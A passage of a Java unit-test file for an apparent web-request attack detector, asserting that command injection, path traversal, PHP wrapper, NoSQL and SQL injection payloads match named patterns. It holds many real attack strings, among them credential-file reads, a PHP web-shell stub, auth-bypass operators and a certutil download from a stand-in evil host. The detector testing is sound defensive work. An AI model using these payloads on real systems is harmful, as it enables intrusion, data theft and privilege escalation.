    @Test public void win88_cmdAndWhoami() { assertMatch("&& whoami", "body", "os_cmd_shell_commands", "whoam"); }
    @Test public void win89_cmdSemicolon() { assertMatch("; whoami", "body", "os_cmd_shell_commands", "whoam"); }
    @Test public void win90_cmdBackgroundExec() { assertMatch("& cmd /c start /b cmd /c whoami > C:\\Temp\\out.txt", "body", "windows_cmd_execution", "cmd"); }
    @Test public void win91_cmdForLoop() { assertMatch("| cmd /c \"for /f %i in ('whoami') do echo %i\"", "body", "windows_cmd_execution", "cmd"); }
    @Test public void win92_cmdTypeWinIni() { assertMatch("| cmd /c type C:\\Windows\\win.ini", "body", "windows_cmd_execution", "cmd"); }

    // =====================================================================
    //  WINDOWS CMD INJECTION — ADDITIONAL TOOLS & LOCATIONS (197-206)
    // =====================================================================

    @Test public void win93_cmdInUrl() { assertMatch("/api?cmd=| cmd /c whoami", "url", "windows_cmd_execution", "cmd"); }
    @Test public void win94_cmdInHeaders() { assertMatch("| cmd /c dir", "headers", "windows_cmd_execution", "cmd"); }
    @Test public void win95_psInUrl() { assertMatchAnyPrefix("/exec?c=powershell -Command Get-Process", "url", new String[]{"windows_powershell_syntax", "windows_cmd_execution"}, "powershell"); }
    @Test public void win96_netExeUser() { assertMatch("net.exe user administrator", "body", "windows_net_commands", "net"); }
    @Test public void win97_pingExeFlag() { assertMatch("ping.exe -n 1 evil.com", "body", "windows_ping", "ping"); }
    @Test public void win98_wmicQfe() { assertMatch("wmic qfe list brief", "body", "windows_system_commands", "wmic"); }
    @Test public void win99_wmicComputer() { assertMatch("wmic computersystem get Name,Domain,Manufacturer", "body", "windows_system_commands", "wmic"); }
    @Test public void win100_certutilVerifyctl() { assertMatch("certutil -verifyctl -f -split http://evil.com/payload.txt C:\\Temp\\p.txt", "body", "windows_system_commands", "certutil"); }

    // =====================================================================
    //  LFI / PATH TRAVERSAL — Basic directory traversal (1-12)
    //  Expected pattern: lfi_directory_traversal
    //  Payloads: ../../../ sequences (require 2+ repetitions)
    // =====================================================================

    @Test public void lfi01_basicEtcPasswd() { assertMatch("/download?file=../../../../etc/passwd", "url", "lfi_directory_traversal", "../"); }
    @Test public void lfi02_deepTraversal() { assertMatch("/include?page=../../../../../../etc/shadow", "url", "lfi_directory_traversal", "../"); }
    @Test public void lfi03_winBackslash() { assertMatch("/load?path=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "url", "lfi_directory_traversal", "..\\"); }
    @Test public void lfi04_bodyTraversal() { assertMatch("{\"template\":\"../../../../../../../etc/passwd\"}", "body", "lfi_directory_traversal", "../"); }
    @Test public void lfi05_headerTraversal() { assertMatch("{x-file-path=[../../../../etc/hostname]}", "headers", "lfi_directory_traversal", "../"); }
    @Test public void lfi06_urlEncodedSlash() { assertMatch("/view?f=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "url", "lfi_directory_traversal", "%2e%2e/"); }
    @Test public void lfi07_fullUrlEncoded() { assertMatch("/get?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "url", "lfi_directory_traversal", "%2e%2e%2f"); }
    @Test public void lfi08_urlEncodedBackslash() { assertMatch("/page?inc=%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd", "url", "lfi_directory_traversal", "%2e%2e"); }
    @Test public void lfi09_mixedSlashBackslash() { assertMatch("/api/export?path=..\\../..\\../etc/passwd", "url", "lfi_directory_traversal", "../"); }
    @Test public void lfi10_tripleDeep() { assertMatch("{\"filepath\":\"../../../proc/self/cmdline\"}", "body", "lfi_directory_traversal", "../"); }
    @Test public void lfi11_manyLevels() { assertMatch("/static?res=../../../../../../../../../../../../etc/passwd", "url", "lfi_directory_traversal", "../"); }
    @Test public void lfi12_dotdotInJson() { assertMatch("{\"import\":\"../../../../../../etc/crontab\"}", "body", "lfi_directory_traversal", "../"); }

    // =====================================================================
    //  LFI — Sensitive file paths (13-24)
    //  Expected pattern: lfi_sensitive_files
    // =====================================================================

    @Test public void lfi13_etcPasswd() { assertMatch("/read?f=/etc/passwd", "url", "lfi_sensitive_files", "etc/passwd"); }
    @Test public void lfi14_etcShadow() { assertMatch("/download?file=/etc/shadow", "url", "lfi_sensitive_files", "etc/shadow"); }
    @Test public void lfi15_procSelfEnviron() { assertMatch("/render?tpl=/proc/self/environ", "url", "lfi_sensitive_files", "proc/self/environ"); }
    @Test public void lfi16_winSystemIni() { assertMatch("{\"path\":\"/windows/system.ini\"}", "body", "lfi_sensitive_files", "windows/system.ini"); }
    @Test public void lfi17_winIni() { assertMatch("/static/../../windows/win.ini", "url", "lfi_sensitive_files", "windows/win.ini"); }
    @Test public void lfi18_bootIni() { assertMatch("{\"include\":\"\\\\boot.ini\"}", "body", "lfi_sensitive_files", "boot.ini"); }
    @Test public void lfi19_etcPasswdBody() { assertMatch("{\"config_file\":\"/etc/passwd\"}", "body", "lfi_sensitive_files", "etc/passwd"); }
    @Test public void lfi20_etcShadowHeader() { assertMatch("{x-template=[/etc/shadow]}", "headers", "lfi_sensitive_files", "etc/shadow"); }
    @Test public void lfi21_etcPasswdInHeader() { assertMatch("{x-include=[/etc/passwd]}", "headers", "lfi_sensitive_files", "etc/passwd"); }
    @Test public void lfi22_winIniForwardSlash() { assertMatch("/get?p=/windows/win.ini", "url", "lfi_sensitive_files", "windows/win.ini"); }
    @Test public void lfi23_procSelfTraversal() { assertMatch("/view?file=../../../../proc/self/environ", "url", "lfi_sensitive_files", "proc/self/environ"); }
    @Test public void lfi24_etcPasswdTraversal() { assertMatch("{\"f\":\"..%2f..%2f..%2f..%2fetc/passwd\"}", "body", "lfi_sensitive_files", "etc/passwd"); }

    // =====================================================================
    //  LFI — PHP wrappers (25-36)
    //  Expected pattern: lfi_php_wrappers
    // =====================================================================

    @Test public void lfi25_phpFilterBase64() { assertMatch("/index.php?page=php://filter/convert.base64-encode/resource=index.php", "url", "lfi_php_wrappers", "php://filter"); }
    @Test public void lfi26_phpFilterRot13() { assertMatch("/page.php?file=php://filter/read=string.rot13/resource=config.php", "url", "lfi_php_wrappers", "php://filter"); }
    @Test public void lfi27_phpFilterIcon() { assertMatch("/inc?p=php://filter/convert.iconv.utf-8.utf-16/resource=db.php", "url", "lfi_php_wrappers", "php://filter"); }
    @Test public void lfi28_phpFilterChain() { assertMatch("{\"tpl\":\"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\"}", "body", "lfi_php_wrappers", "php://filter"); }
    @Test public void lfi29_phpInput() { assertMatch("/exploit.php?page=php://input", "url", "lfi_php_wrappers", "php://input"); }
    @Test public void lfi30_phpInputBody() { assertMatch("{\"include\":\"php://input\"}", "body", "lfi_php_wrappers", "php://input"); }
    @Test public void lfi31_phpData() { assertMatch("/page?f=php://data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=", "url", "lfi_php_wrappers", "php://data"); }
    @Test public void lfi32_phpExpect() { assertMatch("/cmd.php?file=php://expect://whoami", "url", "lfi_php_wrappers", "php://expect"); }
    @Test public void lfi33_phpFilterPasswd() { assertMatch("/view?p=php://filter/convert.base64-encode/resource=/etc/passwd", "url", "lfi_php_wrappers", "php://filter"); }
    @Test public void lfi34_phpFilterDoubleB64() { assertMatch("{\"src\":\"php://filter/convert.base64-decode|convert.base64-decode/resource=shell.php\"}", "body", "lfi_php_wrappers", "php://filter"); }
    @Test public void lfi35_phpExpectId() { assertMatch("/exec?f=php://expect://id", "url", "lfi_php_wrappers", "php://expect"); }
    @Test public void lfi36_phpDataPlain() { assertMatch("{\"inc\":\"php://data://text/plain,<?php system('id');?>\"}", "body", "lfi_php_wrappers", "php://data"); }

    // =====================================================================
    //  LFI — Double/overlong encoded traversal (37-42)
    //  Expected pattern: lfi_encoded_traversal
    // =====================================================================

    @Test public void lfi37_doubleEncoded() { assertMatch("/files?name=%252e%252e%252f%252e%252e%252fetc%252fpasswd", "url", "lfi_encoded_traversal", "%252e%252e"); }
    @Test public void lfi38_doubleEncodedBody() { assertMatch("{\"path\":\"%252e%252e/%252e%252e/etc/shadow\"}", "body", "lfi_encoded_traversal", "%252e%252e"); }
    @Test public void lfi39_overlongUtf8() { assertMatch("/load?file=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "url", "lfi_encoded_traversal", "%c0%ae%c0%ae"); }
    @Test public void lfi40_overlongUtf8Body() { assertMatch("{\"f\":\"%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd\"}", "body", "lfi_encoded_traversal", "%c0%ae%c0%ae"); }
    @Test public void lfi41_unicodeFullwidth() { assertMatch("/view?p=%uff0e%uff0e/%uff0e%uff0e/etc/passwd", "url", "lfi_encoded_traversal", "%uff0e%uff0e"); }
    @Test public void lfi42_doubleEncodedDeep() { assertMatch("/dl?f=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow", "url", "lfi_encoded_traversal", "%252e%252e"); }

    // =====================================================================
    //  LFI — Null byte injection (43-46)
    //  Expected pattern: lfi_null_byte
    // =====================================================================

    // Pattern requires .ext%00 (file extension before null byte to bypass extension checks)
    @Test public void lfi43_nullBytePhp() { assertMatch("/include?p=../../config.php%00.txt", "url", "lfi_null_byte", "%00"); }
    @Test public void lfi44_nullByteInc() { assertMatch("/page?f=../../../../etc/passwd.inc%00.html", "url", "lfi_null_byte", "%00"); }
    @Test public void lfi45_nullByteLog() { assertMatch("/read?file=../../../access.log%00.jpg", "url", "lfi_null_byte", "%00"); }
    @Test public void lfi46_nullByteBody() { assertMatch("{\"file\":\"../../db.conf%00.png\"}", "body", "lfi_null_byte", "%00"); }

    // =====================================================================
    //  LFI — Log files & /proc (47-56)
    //  Expected pattern: lfi_log_files
    // =====================================================================

    @Test public void lfi47_apacheAccessLog() { assertMatch("/inc?f=/var/log/apache2/access.log", "url", "lfi_log_files", "/var/log/apache"); }
    @Test public void lfi48_apacheErrorLog() { assertMatch("/page?file=/var/log/apache2/error.log", "url", "lfi_log_files", "/var/log/apache"); }
    @Test public void lfi49_nginxAccessLog() { assertMatch("{\"log\":\"/var/log/nginx/access.log\"}", "body", "lfi_log_files", "/var/log/nginx"); }
    @Test public void lfi50_nginxErrorLog() { assertMatch("/read?f=/var/log/nginx/error.log", "url", "lfi_log_files", "/var/log/nginx"); }
    @Test public void lfi51_authLog() { assertMatch("/debug?file=/var/log/auth.log", "url", "lfi_log_files", "/var/log/auth.log"); }
    @Test public void lfi52_syslog() { assertMatch("{\"path\":\"/var/log/syslog\"}", "body", "lfi_log_files", "/var/log/syslog"); }
    @Test public void lfi53_httpdErrorLog() { assertMatch("/dump?f=/var/log/httpd/error.log", "url", "lfi_log_files", "/var/log/httpd"); }
    @Test public void lfi54_procSelfMaps() { assertMatch("/read?file=/proc/self/environ", "url", "lfi_sensitive_files", "proc/self/environ"); }
    @Test public void lfi55_mysqlLog() { assertMatch("{\"src\":\"/var/log/mysql/error.log\"}", "body", "lfi_log_files", "/var/log/mysql"); }
    @Test public void lfi56_apacheOldLog() { assertMatch("/view?log=/var/log/apache/access.log", "url", "lfi_log_files", "/var/log/apache"); }

    // =====================================================================
    //  LFI — FALSE POSITIVES for LFI patterns
    // =====================================================================

    @Test
    public void fp_lfi_benignPaths() {
        // Relative paths that DON'T have 2+ traversal sequences
        assertEmpty(matcher.scan("/api/v1/users/../settings", "url"), "single ../ not LFI");
        // Normal absolute paths
        assertEmpty(matcher.scan("/var/data/uploads/photo.jpg", "url"), "normal absolute path");
        // PHP class namespace (not wrapper)
        assertEmpty(matcher.scan("{\"class\":\"App\\\\Models\\\\User\"}", "body"), "PHP namespace");
        // Normal file extension
        assertEmpty(matcher.scan("/download?file=report.pdf", "url"), "normal file download");
    }

    // =====================================================================
    //  NOSQL INJECTION — Comparison operators in JSON (1-14)
    //  Expected pattern: nosql_json_operators_comparison
    //  Real auth bypass payloads from PayloadsAllTheThings
    // =====================================================================

    @Test public void nosql01_neEmpty() { assertMatch("{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}", "body", "nosql_json_operators_comparison", "$ne"); }
    @Test public void nosql02_neNull() { assertMatch("{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}", "body", "nosql_json_operators_comparison", "$ne"); }
    @Test public void nosql03_gtEmpty() { assertMatch("{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}", "body", "nosql_json_operators_comparison", "$gt"); }
    @Test public void nosql04_gteZero() { assertMatch("{\"password\":{\"$gte\":0}}", "body", "nosql_json_operators_comparison", "$gte"); }
    @Test public void nosql05_ltZ() { assertMatch("{\"username\":{\"$lt\":\"z\"},\"password\":{\"$lt\":\"z\"}}", "body", "nosql_json_operators_comparison", "$lt"); }
    @Test public void nosql06_lteMax() { assertMatch("{\"age\":{\"$lte\":99999}}", "body", "nosql_json_operators_comparison", "$lte"); }
    @Test public void nosql07_eqAdmin() { assertMatch("{\"username\":{\"$eq\":\"admin\"},\"password\":{\"$ne\":\"\"}}", "body", "nosql_json_operators_comparison", "$eq"); }
    @Test public void nosql08_existsTrue() { assertMatch("{\"username\":{\"$exists\":true},\"password\":{\"$exists\":true}}", "body", "nosql_json_operators_comparison", "$exists"); }
    @Test public void nosql09_regexWild() { assertMatch("{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}", "body", "nosql_json_operators_comparison", "$regex"); }
    @Test public void nosql10_inAdmins() { assertMatch("{\"username\":{\"$in\":[\"admin\",\"root\",\"administrator\"]},\"password\":{\"$gt\":\"\"}}", "body", "nosql_json_operators_comparison", "$in"); }
    @Test public void nosql11_ninGuest() { assertMatch("{\"role\":{\"$nin\":[\"guest\",\"user\"]}}", "body", "nosql_json_operators_comparison", "$nin"); }
    @Test public void nosql12_regexBlindA() { assertMatch("{\"username\":\"admin\",\"password\":{\"$regex\":\"^m\"}}", "body", "nosql_json_operators_comparison", "$regex"); }
    @Test public void nosql13_regexBlindAB() { assertMatch("{\"password\":{\"$regex\":\"^[a-f]\"}}", "body", "nosql_json_operators_comparison", "$regex"); }
    @Test public void nosql14_whereTrue() { assertMatch("{\"$where\":\"return true\"}", "body", "nosql_json_operators_comparison", "$where"); }

    // =====================================================================
    //  NOSQL INJECTION — URL parameter operators (15-24)
    //  Expected pattern: nosql_unquoted_operators
    //  Real payloads: username[$ne]=&password[$ne]=
    // =====================================================================

    @Test public void nosql15_urlNeBypass() { assertMatch("/login?username[$ne]=&password[$ne]=", "url", "nosql_unquoted_operators", "$ne"); }
    @Test public void nosql16_urlGtBypass() { assertMatch("/auth?username[$gt]=&password[$gt]=", "url", "nosql_unquoted_operators", "$gt"); }
    @Test public void nosql17_urlExistsTrue() { assertMatch("/login?username[$exists]=true&password[$exists]=true", "url", "nosql_unquoted_operators", "$exists"); }
    @Test public void nosql18_urlRegexWild() { assertMatch("/api/auth?login[$regex]=a.*&pass[$ne]=x", "url", "nosql_unquoted_operators", "$regex"); }
    @Test public void nosql19_urlGtLt() { assertMatch("/login?login[$gt]=admin&login[$lt]=test&pass[$ne]=1", "url", "nosql_unquoted_operators", "$gt"); }
    @Test public void nosql20_urlWhereTrue() { assertMatch("/find?filter[$where]=return%20true", "url", "nosql_unquoted_operators", "$where"); }
    @Test public void nosql21_urlNe1() { assertMatch("/api/items?price[$ne]=1", "url", "nosql_unquoted_operators", "$ne"); }
    @Test public void nosql22_urlInAdmin() { assertMatch("/users?role[$in][]=admin&role[$in][]=root", "url", "nosql_unquoted_operators", "$in"); }
    @Test public void nosql23_urlEqAdmin() { assertMatch("/login?username[$eq]=admin&password[$ne]=", "url", "nosql_unquoted_operators", "$eq"); }
    @Test public void nosql24_urlNinBlocked() { assertMatch("/search?status[$nin][]=blocked&status[$nin][]=banned", "url", "nosql_unquoted_operators", "$nin"); }

    // =====================================================================
    //  NOSQL INJECTION — Logical operators (25-32)
    //  Expected pattern: nosql_json_operators_logical
    // =====================================================================

    @Test public void nosql25_orBypass() { assertMatch("{\"$or\":[{\"username\":\"admin\"},{\"username\":\"root\"}],\"password\":{\"$ne\":\"\"}}", "body", "nosql_json_operators_logical", "$or"); }
    @Test public void nosql26_orEmpty() { assertMatch("{\"$or\":[{},{\"a\":\"a\"}]}", "body", "nosql_json_operators_logical", "$or"); }
    @Test public void nosql27_andBoth() { assertMatch("{\"$and\":[{\"username\":{\"$ne\":\"\"}},{\"password\":{\"$ne\":\"\"}}]}", "body", "nosql_json_operators_logical", "$and"); }
    @Test public void nosql28_norBlocked() { assertMatch("{\"$nor\":[{\"username\":\"blocked\"}],\"password\":{\"$gt\":\"\"}}", "body", "nosql_json_operators_logical", "$nor"); }
    @Test public void nosql29_notGuest() { assertMatch("{\"username\":{\"$not\":{\"$eq\":\"guest\"}}}", "body", "nosql_json_operators_logical", "$not"); }
    @Test public void nosql30_orMultiple() { assertMatch("{\"$or\":[{\"role\":\"admin\"},{\"role\":\"superadmin\"},{\"role\":\"root\"}]}", "body", "nosql_json_operators_logical", "$or"); }
    @Test public void nosql31_andOr() { assertMatch("{\"$and\":[{\"$or\":[{\"active\":true}]},{\"role\":{\"$ne\":\"guest\"}}]}", "body", "nosql_json_operators_logical", "$and"); }
    @Test public void nosql32_orSingleQuote() { assertMatch("{'$or':[{},{'x':'x'}]}", "body", "nosql_json_operators_logical", "$or"); }

    // =====================================================================
    //  NOSQL INJECTION — Aggregation pipeline (33-40)
    //  Expected pattern: nosql_json_operators_aggregation
    // =====================================================================

    @Test public void nosql33_matchAll() { assertMatch("[{\"$match\":{\"username\":{\"$ne\":\"\"}}}]", "body", "nosql_json_operators_aggregation", "$match"); }
    @Test public void nosql34_lookupCreds() { assertMatch("[{\"$lookup\":{\"from\":\"credentials\",\"localField\":\"uid\",\"foreignField\":\"uid\",\"as\":\"creds\"}}]", "body", "nosql_json_operators_aggregation", "$lookup"); }
    @Test public void nosql35_groupRoles() { assertMatch("[{\"$group\":{\"_id\":\"$role\",\"count\":{\"$sum\":1}}}]", "body", "nosql_json_operators_aggregation", "$group"); }
    @Test public void nosql36_unwindPerms() { assertMatch("[{\"$unwind\":\"$permissions\"}]", "body", "nosql_json_operators_aggregation", "$unwind"); }
    @Test public void nosql37_projectPasswd() { assertMatch("[{\"$project\":{\"password\":1,\"username\":1}}]", "body", "nosql_json_operators_aggregation", "$project"); }
    @Test public void nosql38_addFieldsAdmin() { assertMatch("[{\"$addFields\":{\"isAdmin\":true}}]", "body", "nosql_json_operators_aggregation", "$addfields"); }
    @Test public void nosql39_sortByCount() { assertMatch("[{\"$sortByCount\":\"$category\"}]", "body", "nosql_json_operators_aggregation", "$sortbycount"); }
    @Test public void nosql40_facetPipeline() { assertMatch("[{\"$facet\":{\"byRole\":[{\"$group\":{\"_id\":\"$role\"}}]}}]", "body", "nosql_json_operators_aggregation", "$facet"); }

    // =====================================================================
    //  NOSQL INJECTION — Update operators (41-48)
    //  Expected pattern: nosql_json_operators_update
    // =====================================================================

    @Test public void nosql41_setAdmin() { assertMatch("{\"$set\":{\"role\":\"admin\"}}", "body", "nosql_json_operators_update", "$set"); }
    @Test public void nosql42_setIsAdmin() { assertMatch("{\"$set\":{\"isAdmin\":true}}", "body", "nosql_json_operators_update", "$set"); }
    @Test public void nosql43_unsetMfa() { assertMatch("{\"$unset\":{\"mfa_enabled\":\"\"}}", "body", "nosql_json_operators_update", "$unset"); }
    @Test public void nosql44_pushAdmin() { assertMatch("{\"$push\":{\"roles\":\"admin\"}}", "body", "nosql_json_operators_update", "$push"); }
    @Test public void nosql45_incNegative() { assertMatch("{\"$inc\":{\"loginAttempts\":-999}}", "body", "nosql_json_operators_update", "$inc"); }
    @Test public void nosql46_renamePasswd() { assertMatch("{\"$rename\":{\"password\":\"leaked_password\"}}", "body", "nosql_json_operators_update", "$rename"); }
    @Test public void nosql47_pullRole() { assertMatch("{\"$pull\":{\"roles\":\"user\"}}", "body", "nosql_json_operators_update", "$pull"); }
    @Test public void nosql48_addToSet() { assertMatch("{\"$addToSet\":{\"permissions\":\"admin\"}}", "body", "nosql_json_operators_update", "$addtoset"); }

    // =====================================================================
    //  NOSQL INJECTION — JavaScript injection via $where / eval (49-56)
    //  Expected pattern: nosql_javascript_injection
    // =====================================================================

    @Test public void nosql49_thisMatch() { assertMatch("this.password.match(/^a/)", "body", "nosql_javascript_injection", "this."); }
    @Test public void nosql50_thisMatchWild() { assertMatch("' && this.password.match(/.*/)//", "body", "nosql_javascript_injection", "this."); }
    @Test public void nosql51_evalFunc() { assertMatch("{\"query\":\"eval('db.users.find()')\"}", "body", "nosql_javascript_injection", "eval"); }
    @Test public void nosql52_functionConstructor() { assertMatch("Function('return this.password')()", "body", "nosql_javascript_injection", "Function"); }
    @Test public void nosql53_thisMatchUrlEncoded() { assertMatch("'%20%26%26%20this.password.match(/.*/)//+%00", "body", "nosql_javascript_injection", "this."); }
    @Test public void nosql54_thisUsernameMatch() { assertMatch("this.username.match(/admin/)", "body", "nosql_javascript_injection", "this."); }
    @Test public void nosql55_evalPayload() { assertMatch("eval('sleep(5000)')", "body", "nosql_javascript_injection", "eval"); }
    @Test public void nosql56_functionSleep() { assertMatch("Function('while(true){}')", "body", "nosql_javascript_injection", "Function"); }

    // =====================================================================
    //  NOSQL INJECTION — Time-based blind (57-62)
    //  Expected pattern: nosql_time_based
    // =====================================================================

    @Test public void nosql57_sleepBasic() { assertMatch("sleep(5000)", "body", "nosql_time_based", "sleep"); }
    @Test public void nosql58_sleepInWhere() { assertMatch("{\"$where\":\"sleep(10000)\"}", "body", "nosql_time_based", "sleep"); }
    @Test public void nosql59_newDate() { assertMatch("new Date()", "body", "nosql_time_based", "new Date"); }
    @Test public void nosql60_doWhileLoop() { assertMatch("var d=new Date();do{var cd=new Date();}while(cd-d<10000)", "body", "nosql_time_based", "do"); }
    @Test public void nosql61_sleepQuoted() { assertMatch("';sleep(5000);", "body", "nosql_time_based", "sleep"); }
    @Test public void nosql62_sleepLong() { assertMatch("a';sleep(10000);var xyz='a", "body", "nosql_time_based", "sleep"); }

    // =====================================================================
    //  NOSQL INJECTION — db.collection operations (63-70)
    //  Expected pattern: nosql_db_operations
    // =====================================================================

    @Test public void nosql63_dbUsersFind() { assertMatch("db.users.find({})", "body", "nosql_db_operations", "db.users.find"); }
    @Test public void nosql64_dbUsersInsert() { assertMatch("db.injection.insert({success:1})", "body", "nosql_db_operations", "db.injection.insert"); }
    @Test public void nosql65_dbUsersDrop() { assertMatch("db.users.delete({})", "body", "nosql_db_operations", "db.users.delete"); }
    @Test public void nosql66_dbUsersUpdate() { assertMatch("db.accounts.update({},{\"$set\":{\"role\":\"admin\"}})", "body", "nosql_db_operations", "db.accounts.update"); }
    @Test public void nosql67_dbAggregate() { assertMatch("db.users.aggregate([{\"$match\":{}}])", "body", "nosql_db_operations", "db.users.aggregate"); }
    @Test public void nosql68_dbMapReduce() { assertMatch("db.orders.mapReduce(function(){emit(1,1)},function(k,v){return 1},{})", "body", "nosql_db_operations", "db.orders.mapReduce"); }
    @Test public void nosql69_dbRemove() { assertMatch("db.sessions.remove({\"expired\":true})", "body", "nosql_db_operations", "db.sessions.remove"); }
    @Test public void nosql70_dbCount() { assertMatch("db.users.count({\"role\":\"admin\"})", "body", "nosql_db_operations", "db.users.count"); }

    // =====================================================================
    //  NOSQL INJECTION — Array operators (71-76)
    //  Expected pattern: nosql_json_operators_comparison (all, size, elemmatch, type)
    // =====================================================================

    @Test public void nosql71_allAdmin() { assertMatch("{\"tags\":{\"$all\":[\"admin\"]}}", "body", "nosql_json_operators_comparison", "$all"); }
    @Test public void nosql72_sizeZero() { assertMatch("{\"items\":{\"$size\":0}}", "body", "nosql_json_operators_comparison", "$size"); }
    @Test public void nosql73_elemMatch() { assertMatch("{\"scores\":{\"$elemMatch\":{\"$gt\":90}}}", "body", "nosql_json_operators_comparison", "$elemmatch"); }
    @Test public void nosql74_typeString() { assertMatch("{\"field\":{\"$type\":2}}", "body", "nosql_json_operators_comparison", "$type"); }
    @Test public void nosql75_modCheck() { assertMatch("{\"count\":{\"$mod\":[4,0]}}", "body", "nosql_json_operators_comparison", "$mod"); }
    @Test public void nosql76_exprCompare() { assertMatch("{\"$expr\":{\"$gt\":[\"$balance\",\"$limit\"]}}", "body", "nosql_json_operators_comparison", "$expr"); }

    // =====================================================================
    //  NOSQL INJECTION — Realistic combined payloads (77-86)
    //  These simulate real attack scenarios in realistic HTTP contexts
    // =====================================================================

    @Test public void nosql77_loginBypassFull() { assertMatch("{\"email\":{\"$ne\":\"x\"},\"password\":{\"$ne\":\"x\"},\"rememberMe\":true}", "body", "nosql_json_operators_comparison", "$ne"); }
    @Test public void nosql78_regexExfiltrate() { assertMatch("{\"username\":\"admin\",\"password\":{\"$regex\":\"^S3cr3t\"},\"otp\":{\"$exists\":false}}", "body", "nosql_json_operators_comparison", "$regex"); }
    @Test public void nosql79_orAuthBypass() { assertMatch("{\"$or\":[{\"token\":\"expired\"},{\"role\":{\"$ne\":\"guest\"}}],\"active\":true}", "body", "nosql_json_operators_logical", "$or"); }
    @Test public void nosql80_updateEscalation() { assertMatch("{\"$set\":{\"role\":\"superadmin\",\"permissions\":[\"read\",\"write\",\"delete\",\"admin\"]}}", "body", "nosql_json_operators_update", "$set"); }
    @Test public void nosql81_lookupExfiltrate() { assertMatch("[{\"$match\":{\"active\":true}},{\"$lookup\":{\"from\":\"secrets\",\"localField\":\"userId\",\"foreignField\":\"ownerId\",\"as\":\"secretData\"}}]", "body", "nosql_json_operators_aggregation", "$match"); }
    @Test public void nosql82_urlRegexEnum() { assertMatch("/api/users?username[$regex]=^adm&username[$ne]=test&password[$gt]=", "url", "nosql_unquoted_operators", "$regex"); }
    @Test public void nosql83_dbFindForEach() { assertMatch("db.users.find({role:'admin'}).forEach(printjson)", "body", "nosql_db_operations", "db.users.find"); }
    @Test public void nosql84_wherePassword() { assertMatch("{\"$where\":\"this.password.match(/^[A-Z]/)\"}", "body", "nosql_javascript_injection", "this.password.match"); }
    @Test public void nosql85_sleepTimeBlind() { assertMatch("1';var d=new Date();do{var cd=new Date();}while(cd-d<10000);var xyz='1", "body", "nosql_time_based", "do"); }
    @Test public void nosql86_unsetSecurity() { assertMatch("{\"$unset\":{\"twoFactorEnabled\":\"\",\"securityQuestions\":\"\"}}", "body", "nosql_json_operators_update", "$unset"); }

    // =====================================================================
    //  NOSQL / LFI — FALSE POSITIVES
    // =====================================================================

    @Test
    public void fp_nosql_benignMongo() {
        // Normal MongoDB-like field names that shouldn't trigger
        assertEmpty(matcher.scan("{\"nested\":{\"count\":5,\"total\":100}}", "body"), "benign nested JSON");
        assertEmpty(matcher.scan("{\"query\":\"SELECT * FROM users\"}", "body"), "SQL in JSON (not NoSQL)");
        // Dollar sign in normal context (pricing)
        assertEmpty(matcher.scan("{\"price\":\"$29.99\",\"currency\":\"USD\"}", "body"), "dollar in price");
        // Benign URL with bracket params that aren't operators
        assertEmpty(matcher.scan("/api/items?filter[name]=test&filter[page]=1", "url"), "benign bracket params");
    }

    // =====================================================================
    //  SQL INJECTION — UNION SELECT (1-15)
    //  Expected pattern: sqli_union_select or sqli_union_from
    //  Sources: PayloadsAllTheThings, PortSwigger, OWASP
    // =====================================================================

    @Test public void sqli01_unionBasic() { assertMatch("/items?id=1 UNION SELECT 1,2,3--", "url", "sqli_union_select", "union"); }
    @Test public void sqli02_unionAll() { assertMatch("/items?id=-1 UNION ALL SELECT username,password,3 FROM users--", "url", "sqli_union_select", "union"); }
    @Test public void sqli03_unionNull() { assertMatch("/page?id=' UNION SELECT NULL,NULL,NULL--", "url", "sqli_union_select", "union"); }
    @Test public void sqli04_unionInfoSchema() { assertMatch("' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--", "body", "sqli_union_select", "union"); }
    @Test public void sqli05_unionConcat() { assertMatch("' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users--", "body", "sqli_union_select", "union"); }
    @Test public void sqli06_unionGroupConcat() { assertMatch("' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--", "body", "sqli_union_select", "union"); }
    @Test public void sqli07_unionVersion() { assertMatch("/view?id=0 UNION SELECT NULL,@@version,NULL--", "url", "sqli_union_select", "union"); }
    @Test public void sqli08_unionParens() { assertMatch("') UNION SELECT NULL,NULL,NULL--", "body", "sqli_union_select", "union"); }
    @Test public void sqli09_unionDoubleParens() { assertMatch("')) UNION SELECT NULL,NULL,NULL--", "body", "sqli_union_select", "union"); }
    @Test public void sqli10_unionLoadFile() { assertMatch("-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--", "body", "sqli_union_select", "union"); }
    @Test public void sqli11_unionWide() { assertMatch("0 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--", "body", "sqli_union_select", "union"); }
    @Test public void sqli12_unionCurrentUser() { assertMatch("' UNION SELECT NULL,current_user(),NULL--", "body", "sqli_union_select", "union"); }
    @Test public void sqli13_unionSchema() { assertMatch("' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--", "url", "sqli_union_select", "union"); }
    @Test public void sqli14_unionColumnEnum() { assertMatch("' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--", "url", "sqli_union_select", "union"); }
    @Test public void sqli15_unionMssqlSysdatabases() { assertMatch("' UNION SELECT NULL,name,NULL FROM master..sysdatabases--", "body", "sqli_union_select", "union"); }

    // =====================================================================
    //  SQL INJECTION — BOOLEAN BLIND (16-27)
    //  Expected pattern: sqli_or_boolean
    // =====================================================================

    @Test public void sqli16_or1eq1() { assertMatch("/users?id=1 OR 1=1--", "url", "sqli_or_boolean", "or"); }
